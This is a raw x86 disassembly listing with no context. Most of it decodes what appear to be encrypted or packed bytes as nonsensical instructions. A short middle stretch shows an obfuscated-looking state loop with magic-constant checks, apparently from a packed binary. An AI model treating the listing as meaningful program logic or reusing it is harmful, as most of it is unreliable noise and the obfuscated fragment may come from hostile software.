  40bcb4:	and    eax,0xd73a279c
  40bcb9:	add    al,0x22
  40bcbb:	xor    DWORD PTR [edx],edx
  40bcbd:	mov    bl,0x75
  40bcbf:	pop    es
  40bcc0:	aaa    
  40bcc1:	les    eax,FWORD PTR [ebp+ebp*8-0x5c1e5f82]
  40bcc8:	xchg   esp,eax
  40bcc9:	adc    eax,0x62a1d43d
  40bcce:	nop
  40bccf:	ss jmp 0x3f0c08e8
  40bcd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd6:	add    al,0xa4
  40bcd8:	data16 data16 test al,0x3
  40bcdc:	icebp  
  40bcdd:	in     eax,dx
  40bcde:	aam    0x1d
  40bce0:	call   0xb4fbeb64
  40bce5:	clc    
  40bce6:	inc    ebx
  40bce7:	push   cs
  40bce8:	lods   al,BYTE PTR ds:[esi]
  40bce9:	fild   QWORD PTR [edi+0x4d9ab007]
  40bcef:	mov    dl,0x4c
  40bcf1:	mov    ecx,0x713a3203
  40bcf6:	jmp    0xf28e3d82
  40bcfb:	pop    ds
  40bcfc:	cmp    al,dl
  40bcfe:	into   
  40bcff:	loope  0x40bd68
  40bd01:	scas   eax,DWORD PTR es:[edi]
  40bd02:	inc    ecx
  40bd03:	rcr    BYTE PTR [edx-0x16b5838b],0xfa
  40bd0a:	shr    BYTE PTR ds:0x60a5a093,cl
  40bd10:	cmp    DWORD PTR cs:[edi],0x86345c2d
  40bd17:	fadd   st,st(2)
  40bd19:	cmp    al,0xaf
  40bd1b:	push   esi
  40bd1c:	sbb    eax,0xf54a466d
  40bd21:	call   0xebc3:0x6cccc2b6
  40bd28:	mov    esi,0xb824bd7f
  40bd2d:	or     al,0x2e
  40bd2f:	xchg   esp,eax
  40bd30:	mov    ah,0x32
  40bd32:	ja     0x40bd52
  40bd34:	gs inc esp
  40bd36:	push   cs
  40bd37:	fidiv  WORD PTR [ecx]
  40bd39:	test   eax,0x43a7dc77
  40bd3e:	int    0xda
  40bd40:	shl    BYTE PTR [ebx],1
  40bd42:	adc    edx,DWORD PTR [eax+eax*8]
  40bd45:	or     bl,cl
  40bd47:	fldenv [edx-0x3f]
  40bd4a:	jno    0x40bd7a
  40bd4c:	paddd  mm3,QWORD PTR [esi-0x21]
  40bd50:	pop    esi
  40bd51:	xor    al,0xbf
  40bd53:	jne    0x40bdb5
  40bd55:	ds sub esi,ebp
  40bd58:	hlt    
  40bd59:	retf   
  40bd5a:	in     eax,0xb9
  40bd5c:	out    dx,eax
  40bd5d:	inc    ecx
  40bd5e:	mov    ds:0x7a1bb9b8,al
  40bd63:	frstor [edx]
  40bd65:	add    dl,ah
  40bd67:	jle    0x40bd5f
  40bd69:	les    ebp,FWORD PTR [edi-0x6d1b86d1]
  40bd6f:	ja     0x40bdcb
  40bd71:	nop    DWORD PTR [edi]
  40bd74:	cmp    DWORD PTR [edi-0x1e384af9],esp
  40bd7a:	mov    DWORD PTR [edx],esp
  40bd7c:	loop   0x40bd60
  40bd7e:	in     al,0x68
  40bd80:	inc    edi
  40bd81:	cld    
  40bd82:	inc    eax
  40bd83:	lods   al,BYTE PTR ds:[esi]
  40bd84:	push   ebx
  40bd85:	shr    ebx,0x39
  40bd88:	enter  0x21f4,0x8f
  40bd8c:	sbb    eax,0xebd3815c
  40bd91:	vmread esp,esi
  40bd94:	sub    eax,0xf3a0a39b
  40bd99:	lea    edx,[ebx-0x4]
  40bd9c:	mov    DWORD PTR [esi-0x2b4581eb],ebp
  40bda2:	dec    esp
  40bda3:	das    
  40bda4:	or     dl,BYTE PTR [edi+0x6e7a265d]
  40bdaa:	test   al,0xf3
  40bdac:	lahf   
  40bdad:	jecxz  0x40bd42
  40bdaf:	push   ebx
  40bdb0:	mov    esp,0x62adf8d5
  40bdb5:	fmul   DWORD PTR [esi+0xd]
  40bdb8:	cmpps  xmm0,XMMWORD PTR [eax+ecx*8-0x516b6fb0],0xfa
  40bdc1:	xchg   DWORD PTR [ecx],edi
  40bdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc4:	push   cs
  40bdc5:	rcr    BYTE PTR [edi+0x10e101eb],1
  40bdcb:	jmp    0x92de8822
  40bdd0:	mov    eax,0xcbe0efb
  40bdd5:	adc    eax,eax
  40bdd7:	ret    0x227a
  40bdda:	loopne 0x40bda5
  40bddc:	sub    BYTE PTR es:[esi],dh
  40bddf:	xor    BYTE PTR [ebp-0x7a],bl
  40bde2:	adc    dh,BYTE PTR [ebx]
  40bde4:	ret    0x3f9a
  40bde7:	sub    BYTE PTR [edi+0xff4a62b],dh
  40bded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdee:	adc    eax,DWORD PTR [ebx+0x60]
  40bdf1:	push   ds
  40bdf2:	mov    edx,0xda52d83e
  40bdf7:	sahf   
  40bdf8:	fadd   QWORD PTR [eax+0x3]
  40bdfb:	iret   
  40bdfc:	stos   DWORD PTR es:[edi],eax
  40bdfd:	ins    BYTE PTR es:[edi],dx
  40bdfe:	ins    DWORD PTR es:[edi],dx
  40bdff:	into   
  40be00:	push   ss
  40be01:	fcomp  QWORD PTR [ebp+0x1cc55eae]
  40be07:	lahf   
  40be08:	iret   
  40be09:	xchg   ebp,eax
  40be0a:	ins    DWORD PTR es:[edi],dx
  40be0b:	inc    ebx
  40be0c:	les    ebx,FWORD PTR cs:[esi+edi*2+0x6124189]
  40be14:	mov    esp,DWORD PTR [edx]
  40be16:	sub    eax,DWORD PTR [ecx-0x225ba91]
  40be1c:	jnp    0x40be0e
  40be1e:	sub    al,0x71
  40be20:	ins    BYTE PTR es:[edi],dx
  40be21:	mov    ecx,ebp
  40be23:	mov    esp,0xab060a93
  40be28:	mov    edx,0x7ad64894
  40be2d:	and    al,0x49
  40be2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be30:	mov    al,0xc1
  40be32:	or     al,0x56
  40be34:	mov    bh,BYTE PTR [esi+ebp*1-0x7d78b623]
  40be3b:	push   es
  40be3c:	dec    edi
  40be3d:	repnz or eax,0xaf754d7b
  40be43:	out    dx,eax
  40be44:	pop    es
  40be45:	pop    edi
  40be46:	xor    DWORD PTR [eax],edx
  40be48:	leave  
  40be49:	test   eax,0xd66a14fb
  40be4e:	and    eax,0x4603409b
  40be53:	add    al,0xf2
  40be55:	mov    esi,0x75f36ede
  40be5a:	lods   al,BYTE PTR ds:[esi]
  40be5b:	inc    edx
  40be5c:	stos   BYTE PTR es:[edi],al
  40be5d:	retf   0x198b
  40be60:	jmp    0x40bea2
  40be62:	pushf  
  40be63:	arpl   WORD PTR [edx-0x7b46d204],si
  40be69:	int    0x7f
  40be6b:	repnz (bad) [ecx+0x49]
  40be6f:	mov    cl,0xd
  40be71:	mov    ah,0x49
  40be73:	pop    edx
  40be74:	(bad)  
  40be75:	dec    esp
  40be76:	sub    dl,BYTE PTR [esp+edi*8-0x2199ce98]
  40be7d:	cmp    al,BYTE PTR [edi+0x247146a4]
  40be83:	ds int 0xa5
  40be86:	aas    
  40be87:	jns    0x40bf04
  40be89:	or     edi,esp
  40be8b:	mov    eax,0x85fd490f
  40be90:	stc    
  40be91:	push   eax
  40be92:	add    ah,BYTE PTR [ecx-0x32]
  40be95:	push   ebx
  40be96:	sbb    ebp,edx
  40be98:	cdq    
  40be99:	push   edi
  40be9a:	rcl    DWORD PTR [eax],1
  40be9c:	add    BYTE PTR [ebp+ebp*1+0x5e799f79],0xdc
  40bea4:	out    dx,eax
  40bea5:	jb     0x40bea3
  40bea7:	inc    ebx
  40bea8:	inc    ebx
  40bea9:	out    dx,al
  40beaa:	daa    
  40beab:	clc    
  40beac:	or     BYTE PTR [edx],ch
  40beae:	(bad)  
  40beaf:	mov    edi,DWORD PTR gs:[ebp+0x8]
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	jge    0x40bf99
  40c014:	imul   ebp,esp,0xffffffd4
  40c017:	jmp    0x5f5a3a96
  40c01c:	jp     0x40c098
  40c01e:	jns    0x40bfcb
  40c020:	mov    ebp,cs
  40c022:	mov    edi,0xe1cd9500
  40c027:	sar    DWORD PTR [edi-0x24a54c99],0xf0
  40c02e:	adc    ch,BYTE PTR [edi-0x4b0b0b92]
  40c034:	cmp    al,0x4e
  40c036:	sub    al,0xfe
  40c038:	mul    BYTE PTR [ecx-0x7b89e21]
  40c03e:	lods   al,BYTE PTR ds:[esi]
  40c03f:	shr    BYTE PTR [ebp+0x1074a85e],1
  40c045:	shr    DWORD PTR [esi-0x2b],cl
  40c048:	out    dx,al
  40c049:	jge    0x40c03e
  40c04b:	xor    cl,BYTE PTR [ecx+eax*8-0x2a]
  40c04f:	ret    
  40c050:	(bad)  [ecx-0x72760178]
  40c056:	outs   dx,BYTE PTR ds:[esi]
  40c057:	sbb    al,0x4e
  40c059:	das    
  40c05a:	xor    edx,eax
  40c05c:	ins    DWORD PTR es:[edi],dx
  40c05d:	fucom  st(2)
  40c05f:	cmp    DWORD PTR [eax],eax
  40c061:	jp     0x40c0d5
  40c063:	cli    
  40c064:	out    0x49,eax
  40c066:	test   eax,0xc3d395b6
  40c06b:	xchg   edi,eax
  40c06c:	dec    ebp
  40c06d:	idiv   BYTE PTR [ebx-0x50]
  40c070:	push   ebp
  40c071:	mov    eax,0x8368bd3a
  40c076:	inc    eax
  40c077:	out    0x6c,al
  40c079:	outs   dx,BYTE PTR ds:[esi]
  40c07a:	and    eax,DWORD PTR [edx]
  40c07c:	js     0x40c0ac
  40c07e:	pop    ecx
  40c07f:	popa   
  40c080:	cdq    
  40c081:	ret    
  40c082:	xor    ah,ah
  40c084:	add    al,0xf7
  40c086:	in     eax,0xee
  40c088:	sbb    eax,eax
  40c08a:	mov    eax,ds:0x224dda8d
  40c08f:	aad    0x98
  40c091:	sbb    esi,DWORD PTR [edi]
  40c093:	ja     0x40c054
  40c095:	sub    al,BYTE PTR [edi-0x4cc556fb]
  40c09b:	mov    dl,0x8
  40c09d:	sbb    DWORD PTR [ebp+0x54cb7f86],ebp
  40c0a3:	out    0xa4,eax
  40c0a5:	fnstenv [esi]
  40c0a7:	push   esp
  40c0a8:	jg     0x40c092
  40c0aa:	sti    
  40c0ab:	or     DWORD PTR [edx-0x6d2c7366],0x21
  40c0b2:	ins    DWORD PTR es:[edi],dx
  40c0b3:	(bad)  
  40c0b4:	dec    edi
  40c0b5:	mov    dh,0x0
  40c0b7:	push   ecx
  40c0b8:	in     eax,dx
  40c0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ba:	push   cs
  40c0bb:	daa    
  40c0bc:	cmp    al,0x82
  40c0be:	sub    dh,BYTE PTR [edx]
  40c0c0:	pop    edx
  40c0c1:	push   0x3a89fce6
  40c0c6:	pop    ecx
  40c0c7:	xchg   edx,eax
  40c0c8:	pop    edi
  40c0c9:	xor    BYTE PTR [ebx-0xef75cdb],0x5f
  40c0d0:	jmp    DWORD PTR [ecx+0x71]
  40c0d3:	jno    0x40c0af
  40c0d5:	inc    DWORD PTR [esi-0x17f61111]
  40c0db:	sar    edx,1
  40c0dd:	js     0x40c121
  40c0df:	test   DWORD PTR [ebx+0x42826f7],esi
  40c0e5:	fst    DWORD PTR [esi]
  40c0e7:	mov    ah,0xf0
  40c0e9:	cmp    bh,ch
  40c0eb:	inc    esi
  40c0ec:	test   DWORD PTR [ecx],edx
  40c0ee:	pop    edi
  40c0ef:	or     ebx,0x75293a1
  40c0f5:	repnz xor al,0xe0
  40c0f8:	(bad)  
  40c0f9:	push   edx
  40c0fa:	aad    0x5e
  40c0fc:	add    BYTE PTR [ecx+0x59470b46],cl
  40c102:	dec    esp
  40c103:	ja     0x40c124
  40c105:	js     0x40c135
  40c107:	or     al,0x1a
  40c109:	or     BYTE PTR [edx-0x618839a6],cl
  40c10f:	test   BYTE PTR [edi],cl
  40c111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c112:	(bad)  
  40c113:	fcmovnu st,st(6)
  40c115:	mov    BYTE PTR [ebp+0x77],dh
  40c118:	aad    0x25
  40c11a:	sub    BYTE PTR [ecx+ebx*1],bh
  40c11d:	or     eax,0x4f87501a
  40c122:	jbe    0x40c0eb
  40c124:	xchg   edi,eax
  40c125:	loop   0x40c199
  40c127:	rol    bl,0xa3
  40c12a:	call   0x5d77e387
  40c12f:	fstp   DWORD PTR [edx]
  40c131:	jnp    0x40c107
  40c133:	push   0xf19b28c4
  40c138:	sbb    BYTE PTR [edx-0xece0f36],bl
  40c13e:	(bad)  
  40c13f:	clc    
  40c140:	lock outs dx,DWORD PTR ds:[esi]
  40c142:	cdq    
  40c143:	add    bl,BYTE PTR [edi]
  40c145:	repz pop ebp
  40c147:	in     eax,dx
  40c148:	loope  0x40c1c3
  40c14a:	cmc    
  40c14b:	pop    ebx
  40c14c:	adc    esp,esp
  40c14e:	push   0x3e
  40c150:	jo     0x40c1a9
  40c152:	pop    ss
  40c153:	std    
  40c154:	mov    fs,ebx
  40c156:	pop    edx
  40c157:	std    
  40c158:	push   ds
  40c159:	dec    esp
  40c15a:	sub    BYTE PTR [ebx+0x6f],dl
  40c15d:	inc    esi
  40c15e:	frstor ds:0xd38f3789
  40c164:	mov    eax,ds:0x1a5becb6
  40c169:	js     0x40c138
  40c16b:	inc    ecx
  40c16c:	les    ebx,FWORD PTR [edi-0x14]
  40c16f:	adc    cl,dh
  40c171:	xor    al,0x8d
  40c173:	pop    edi
  40c174:	call   DWORD PTR [ebx]
  40c176:	rcr    BYTE PTR [esi+0x28],0xc2
  40c17a:	cmp    BYTE PTR [ebx-0x7f],al
  40c17d:	sbb    dl,BYTE PTR [esi-0x66]
  40c180:	lds    esi,FWORD PTR [edi+0x4d2eee7]
  40c186:	scas   al,BYTE PTR es:[edi]
  40c187:	scas   al,BYTE PTR es:[edi]
  40c188:	out    dx,al
  40c189:	sub    eax,DWORD PTR [eax]
  40c18b:	sub    DWORD PTR [esi-0x5bcad00e],eax
  40c191:	fwait
  40c192:	push   ds
  40c193:	popf   
  40c194:	addr16 js 0x40c11a
  40c197:	ins    DWORD PTR es:[edi],dx
  40c198:	inc    edx
  40c199:	(bad)  
  40c19a:	fstp   st(5)
  40c19c:	sub    eax,0x2402c33a
  40c1a1:	xor    al,0x6a
  40c1a3:	fwait
  40c1a4:	mov    ebp,0x60fe1595
  40c1a9:	(bad)  
  40c1ab:	push   0xffffffff
  40c1ad:	push   edx
  40c1ae:	mov    cl,ah
  40c1b0:	xchg   ebx,eax
  40c1b1:	ja     0x40c166
  40c1b3:	ss gs out dx,al
  40c1b6:	dec    esi
  40c1b7:	mov    dh,0xab
  40c1b9:	idiv   BYTE PTR [ebp+0x54]
  40c1bc:	lea    esi,[esi]
  40c1be:	out    dx,eax
  40c1bf:	or     DWORD PTR [edx+0x62],eax
  40c1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c3:	pushf  
  40c1c4:	jnp    0x40c1cc
  40c1c6:	aad    0x65
  40c1c8:	daa    
  40c1c9:	icebp  
  40c1ca:	adc    ebp,DWORD PTR [ecx-0x4f3c7310]
  40c1d0:	pushf  
  40c1d1:	in     al,0x2d
  40c1d3:	daa    
  40c1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d5:	mov    edi,0x3659a450
  40c1da:	xchg   edi,eax
  40c1db:	(bad)  
  40c1dc:	rep outs dx,BYTE PTR ds:[esi]
  40c1de:	shl    BYTE PTR [ebp-0x54],1
  40c1e1:	inc    esi
  40c1e2:	ins    DWORD PTR es:[edi],dx
  40c1e3:	pushf  
  40c1e4:	cli    
  40c1e5:	push   ds
  40c1e6:	xchg   ebx,eax
  40c1e7:	or     al,0xe9
  40c1e9:	dec    ecx
  40c1ea:	cdq    
  40c1eb:	int3   
  40c1ec:	add    al,0xb8
  40c1ee:	pushf  
  40c1ef:	mov    dl,0xe0
  40c1f1:	sahf   
  40c1f2:	push   esp
  40c1f3:	mov    ecx,DWORD PTR [eax-0x54]
  40c1f6:	pop    eax
  40c1f7:	ret    0xb9d5
  40c1fa:	mov    esi,0xd156260c
  40c1ff:	push   ebx
  40c200:	pop    es
  40c201:	rcl    BYTE PTR [esp+eiz*8-0x1453328f],0x68
  40c209:	mov    ebp,0x8f6a12bf
  40c20e:	in     al,0x2
  40c210:	inc    ebx
  40c211:	xor    ah,BYTE PTR [ecx]
  40c213:	mov    edx,0x6552cee1
  40c218:	mov    WORD PTR cs:[esi-0x40],gs
  40c21c:	xor    ecx,ebp
  40c21e:	jae    0x40c274
  40c220:	inc    edi
  40c221:	jl     0x40c235
  40c223:	or     edx,DWORD PTR [ebp+0x10]
  40c226:	scas   eax,DWORD PTR es:[edi]
  40c227:	dec    ecx
  40c228:	mov    ah,dh
  40c22a:	lods   al,BYTE PTR ds:[esi]
  40c22b:	inc    ebp
  40c22c:	out    dx,eax
  40c22d:	ins    DWORD PTR es:[edi],dx
  40c22e:	fimul  DWORD PTR [eax+esi*2-0x7a1c9f71]
  40c235:	out    dx,al
  40c236:	mul    DWORD PTR [ebx]
  40c238:	aad    0x6
  40c23a:	setg   BYTE PTR [ecx]
  40c23d:	jbe    0x40c264
  40c23f:	addr16 dec esp
  40c241:	cmp    eax,0xd9933b43
  40c246:	rcr    BYTE PTR [ebp-0x4e63638f],0x8
  40c24d:	mov    bh,0x65
  40c24f:	jb     0x40c21c
  40c251:	xchg   ecx,eax
  40c252:	adc    bl,bl
  40c254:	and    al,0xb2
  40c256:	mov    esi,0xf5bddef
  40c25b:	and    eax,0xeeac7309
  40c260:	sbb    eax,0x47648e19
  40c265:	cmp    eax,0xf1b20aa6
  40c26a:	nop
  40c26b:	add    BYTE PTR [edx+0x3461e9cb],bh
  40c271:	mov    dh,0x8b
  40c273:	add    DWORD PTR [edx-0x16141edb],edx
  40c279:	addr16 call 0xb67241f
  40c27f:	push   DWORD PTR [esi+0x6c5ebe7d]
  40c285:	shrd   ebx,esp,cl
  40c288:	mov    eax,ds:0x79f6d949
  40c28d:	in     al,dx
  40c28e:	addr16 inc ecx
  40c290:	cmp    edi,ebp
  40c292:	lods   al,BYTE PTR ds:[esi]
  40c293:	mov    WORD PTR [edx-0x5d1e9bed],ss
  40c299:	loopne 0x40c2e0
  40c29b:	sbb    ch,dh
  40c29d:	or     edx,ebp
  40c29f:	test   BYTE PTR [ebx],bh
  40c2a1:	neg    BYTE PTR [edx-0x7e]
  40c2a4:	mov    ss,WORD PTR [edx+0x5c]
  40c2a7:	pop    esi
  40c2a8:	xor    eax,0x4f5eafdf
  40c2ad:	mov    ecx,0x5ba76d00
  40c2b2:	mov    bl,0x1a
  40c2b4:	daa    
  40c2b5:	mov    esp,0xf9699cb0
  40c2ba:	mov    ?,WORD PTR [ebp+0xb]
  40c2bd:	faddp  st(0),st
  40c2bf:	add    BYTE PTR [ecx],0xd1
  40c2c2:	adc    al,0xcd
  40c2c4:	xchg   esp,eax
  40c2c5:	cmp    eax,0xeaeb4a18
  40c2ca:	xchg   ebp,eax
  40c2cb:	test   al,0xdb
  40c2cd:	loopne 0x40c2df
  40c2cf:	dec    ebx
  40c2d0:	adc    BYTE PTR [esi-0x382f6451],cl
  40c2d6:	outs   dx,BYTE PTR ds:[esi]
  40c2d7:	rcl    BYTE PTR es:[esi],cl
  40c2da:	stos   BYTE PTR es:[edi],al
  40c2db:	cld    
  40c2dc:	shr    BYTE PTR [esi],0x30
  40c2df:	sbb    dl,al
  40c2e1:	mov    esi,0xf098db42
  40c2e6:	(bad)  
  40c2e7:	add    BYTE PTR [edi],0x95
  40c2ea:	iret   
  40c2eb:	arpl   WORD PTR [ebp-0x135e46b2],dx
  40c2f1:	jp     0x40c36e
  40c2f3:	rcl    BYTE PTR gs:0x34b620a3,1
  40c2fa:	cld    
  40c2fb:	inc    ebx
  40c2fc:	cmp    BYTE PTR ds:0x2326aa4e,0xa6
  40c303:	aaa    
  40c304:	dec    ebx
  40c305:	cmp    ch,0xe8
  40c308:	out    0x4a,eax
  40c30a:	cmc    
  40c30b:	adc    DWORD PTR [eax],ebp
  40c30d:	inc    esi
  40c30e:	mov    eax,0xd1cc4e66
  40c313:	fwait
  40c314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c315:	pop    ss
  40c316:	mov    eax,ds:0x814ca5f3
  40c31b:	clc    
  40c31c:	push   cs
  40c31d:	sbb    al,0x18
  40c31f:	dec    ecx
  40c320:	outs   dx,BYTE PTR ds:[esi]
  40c321:	into   
  40c322:	xor    DWORD PTR [esi-0x68104ec4],0xce57b56
  40c32c:	stos   DWORD PTR es:[edi],eax
  40c32d:	ret    0x9e5b
  40c330:	fs sbb ecx,edx
  40c333:	xchg   edx,ebx
  40c335:	mov    edi,0x3f5d8bd3
  40c33a:	xchg   esi,eax
  40c33b:	fsub   DWORD PTR [ebx+0x9]
  40c33e:	lea    esi,[eax+0x6e59e4ac]
  40c344:	pop    edx
  40c345:	das    
  40c346:	sar    ecx,cl
  40c348:	pop    edi
  40c349:	mov    eax,0x4f0d2cd9
  40c34e:	dec    eax
  40c34f:	daa    
  40c350:	mov    esi,fs
  40c352:	sti    
  40c353:	cmp    DWORD PTR [ebx+0x1458d4bd],ebx
  40c359:	xchg   esi,eax
  40c35a:	push   edi
  40c35b:	dec    ebp
  40c35c:	popa   
  40c35d:	imul   edx,DWORD PTR [edx-0x31],0xea69300f
  40c364:	inc    edi
  40c365:	add    edx,esi
  40c367:	popf   
  40c368:	data16 je 0x40c335
  40c36b:	fs xchg ebp,eax
  40c36d:	jno    0x40c307
  40c36f:	ffreep st(4)
  40c371:	bound  edx,QWORD PTR [edx-0x3f]
  40c374:	mov    ebx,0x19147cad
  40c379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c37a:	lock jae 0x40c31d
  40c37d:	aam    0xc0
  40c37f:	sub    edi,0xb1d506cd
  40c385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c386:	retf   0x2317
  40c389:	out    dx,eax
  40c38a:	adc    eax,0xd079c20a
  40c38f:	adc    dl,BYTE PTR [ecx]
  40c391:	push   0x84944e4d
  40c396:	aam    0xc
  40c398:	lods   al,BYTE PTR ds:[esi]
  40c399:	repz ja 0x40c375
  40c39c:	into   
  40c39d:	mov    ebp,0xbcb8c961
  40c3a2:	push   ebx
  40c3a3:	lods   al,BYTE PTR ds:[esi]
  40c3a4:	ror    BYTE PTR [edx-0x37],cl
  40c3a7:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c3a9:	mov    cl,dl
  40c3ab:	add    dl,dl
  40c3ad:	inc    edx
  40c3ae:	bound  ebp,QWORD PTR [ecx]
  40c3b0:	mov    DWORD PTR [ebx+0x4d],esp
  40c3b3:	in     al,dx
  40c3b4:	sub    eax,0xc33f496
  40c3b9:	mov    dh,0xc5
  40c3bb:	out    0x49,eax
  40c3bd:	add    bh,ah
  40c3bf:	mov    edi,0xfa731cc2
  40c3c4:	jbe    0x40c3d1
  40c3c6:	adc    eax,0xbbd74248
  40c3cb:	xchg   ecx,eax
  40c3cc:	dec    ebx
  40c3cd:	sbb    al,0x5c
  40c3cf:	sbb    DWORD PTR [ebp+0x2b],edi
  40c3d2:	pop    esi
  40c3d3:	test   eax,0xdccb4fb4
  40c3d8:	adc    dx,cx
  40c3db:	sbb    dl,cl
  40c3dd:	test   eax,0x41181fcf
  40c3e2:	das    
  40c3e3:	inc    edi
  40c3e4:	push   esi
  40c3e5:	push   eax
  40c3e6:	lock push es
  40c3e8:	mov    ebp,0xa7a904ef
  40c3ed:	in     eax,dx
  40c3ee:	pusha  
  40c3ef:	ins    DWORD PTR es:[edi],dx
  40c3f0:	enter  0x9fdf,0xae
  40c3f4:	jae    0x40c41f
  40c3f6:	das    
  40c3f7:	cmc    
  40c3f8:	std    
  40c3f9:	xor    ebx,esp
  40c3fb:	imul   esp,eax,0x27
  40c3fe:	or     eax,0xcef9c3c3
  40c403:	mov    ds:0x2b332dd5,eax
  40c408:	jecxz  0x40c471
  40c40a:	gs out dx,eax
  40c40c:	repnz push cs
  40c40e:	popa   
  40c40f:	(bad)  
  40c410:	pusha  
  40c411:	pop    esp
  40c412:	jge    0x40c3b5
  40c414:	mov    WORD PTR [edi],ds
  40c416:	and    eax,0xec20a9d4
  40c41b:	aaa    
  40c41c:	gs xchg ebp,eax
  40c41e:	es movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c422:	adc    al,0x52
  40c424:	jmp    0x104296d
  40c429:	imul   edi,DWORD PTR [ebp+0xa],0x4f
  40c42d:	inc    ebx
  40c42e:	xchg   BYTE PTR ss:[edi],al
  40c431:	fisub  DWORD PTR [ebp-0x32fa2143]
  40c437:	imul   edi,DWORD PTR [edi-0x33],0xc1ed54b6
  40c43e:	pop    ebp
  40c43f:	mov    al,ds:0x70185a4b
  40c444:	jg     0x40c407
  40c446:	fidivr DWORD PTR [ecx+esi*2-0x5fabdb08]
  40c44d:	(bad)  
  40c44e:	shl    dl,0x3
  40c451:	(bad)  [eax]
  40c453:	loope  0x40c3e7
  40c455:	loope  0x40c463
  40c457:	jl     0x40c47b
  40c459:	jle    0x40c434
  40c45b:	push   0x94f9abff
  40c460:	ja     0x40c46d
  40c462:	addr16 dec ebp
  40c464:	sub    DWORD PTR [ecx-0x4c9742be],esi
  40c46a:	sbb    edx,DWORD PTR [edi]
  40c46c:	sbb    BYTE PTR [esi+0x42],ah
  40c46f:	(bad)  [ecx]
  40c471:	stc    
  40c472:	lods   al,BYTE PTR ds:[esi]
  40c473:	sbb    BYTE PTR [ecx-0x2129ee81],bl
  40c479:	mov    bl,0xdb
  40c47b:	mov    esp,0x7a42fe22
  40c480:	(bad)  
  40c481:	push   ds
  40c482:	nop
  40c483:	or     BYTE PTR [ecx],bh
  40c485:	dec    edx
  40c486:	aad    0x4a
  40c488:	and    eax,eax
  40c48a:	mov    ebx,DWORD PTR [eax+0x31]
  40c48d:	pop    edx
  40c48e:	or     ecx,DWORD PTR [eax]
  40c490:	(bad)  
  40c491:	and    eax,0x647176b4
  40c496:	(bad)  
  40c498:	push   0xffffffc1
  40c49a:	fld    DWORD PTR [edi-0x636bcf98]
  40c4a0:	in     al,dx
  40c4a1:	pop    ebx
  40c4a2:	out    dx,al
  40c4a3:	test   eax,esi
  40c4a5:	jbe    0x40c4fb
  40c4a7:	xchg   BYTE PTR [esi-0x330edb7f],al
  40c4ad:	pushf  
  40c4ae:	xchg   ebp,eax
  40c4af:	fwait
